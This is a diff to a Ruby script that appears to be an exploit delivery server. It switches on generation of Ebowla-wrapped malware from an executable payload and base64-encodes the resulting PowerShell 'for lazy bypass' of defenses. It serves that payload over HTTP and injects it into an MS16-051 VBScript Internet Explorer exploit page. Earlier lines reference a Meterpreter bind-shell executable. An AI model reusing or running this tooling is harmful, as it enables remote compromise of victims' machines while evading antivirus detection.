@@ -41,8 +41,11 @@ require 'find'
 # Files will be served from this directory
 WEB_ROOT = './public'
 EXPLOITS = './exploits'
+EBOWLA_INSTALL_DIR = '/home/ubuntu/Ebowla/'
+EBOWLA_EXE_PAYLOAD = '/home/ubuntu/ecdh_old/exploits/004.exe'
+EBOWLA_EXE_PS1_OUTPUT = '/home/ubuntu/ecdh_old/output/powershell_symmetric_004.exe.ps1'
 
-use_ebowla_payload = false
+use_ebowla_payload = true
 listen_port = 2345
 
 options = {}
@@ -99,15 +102,14 @@ end
 #create ebowla malware
 def generate_ebowla(key)
   #add the newly generated public keys to the JS files
-  orig_config = File.read('/home/ubuntu/Ebowla/genetic.config')
+  orig_config = File.read(EBOWLA_INSTALL_DIR + 'genetic.config')
   orig_config.sub! 'myeggmyegghdjsfaskldj', key
-  File.open('/home/ubuntu/Ebowla/genetic.config.new', 'w') { |file| file.write(orig_config) }
+  File.open(EBOWLA_INSTALL_DIR + 'genetic.config.new', 'w') { |file| file.write(orig_config) }
   #execute the Ebowla generator
-  value = %x(/home/ubuntu/Ebowla/ebowla.py /home/ubuntu/met_shell_bind.exe /home/ubuntu/Ebowla/genetic.config.new)
-  value = %x(/home/ubuntu/Ebowla/ebowla.py /home/ubuntu/ecdh/exploits/004.exe /home/ubuntu/Ebowla/genetic.config.new)
+  value = system(EBOWLA_INSTALL_DIR + 'ebowla.py ' + EBOWLA_EXE_PAYLOAD + ' ' + EBOWLA_INSTALL_DIR + 'genetic.config.ecdh')
   puts value
   #encode PS1 for lazy bypass, should be changed for encryption
-  payload =  File.read("/home/ubuntu/ecdh/output/powershell_symmetric_004.exe.ps1", :encoding => "ASCII", :mode=> "rb")  
+  payload =  File.read(EBOWLA_EXE_PS1_OUTPUT, :encoding => "ASCII", :mode=> "rb")  
   payload_base64 = Base64.encode64(payload.force_encoding('ASCII'))
   File.open(WEB_ROOT + "/test.txt", 'w') { |file| file.write(payload_base64) }
 end
@@ -389,7 +391,7 @@ myegg = SecureRandom.hex[0..5]
 if use_ebowla_payload
   EBOWLA_KEY = myegg + myegg +  SecureRandom.hex
   generate_ebowla(EBOWLA_KEY)
-  insert_powershell_payload(EXPLOITS + '/ms16_051_vbscript_notepad.html', EXPLOITS + '/findegg.ps1', myegg)
+  insert_powershell_payload(EXPLOITS + '/IE/ms16_051_vbscript_notepad.html', EXPLOITS + '/IE/findegg.ps1', myegg)
 end
 
 #start new TCP server
